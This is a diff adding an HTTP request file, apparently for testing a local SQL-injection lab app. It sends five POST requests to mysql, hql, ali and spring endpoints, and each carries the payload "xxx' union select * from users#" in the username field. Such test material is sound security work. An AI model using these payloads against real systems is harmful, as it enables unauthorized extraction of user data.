@@ -1,0 +1,45 @@
+###
+POST /sql/mysql/case1 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+id=1&username=xxx' union select * from users#&password=1
+
+
+###
+POST /sql/mysql/case2 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+id=1&username=xxx' union select * from users#&password=1
+
+
+###
+POST /sql/hql/case1 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+id=1&username=xxx' union select * from users#&password=1
+
+
+
+###
+POST /sql/ali/case1 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+id=1&username=xxx' union select * from users#&password=1
+
+
+###
+POST /sql/spring/case1 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+id=1&username=xxx' union select * from users#&password=1
+
+
+
+
+
+
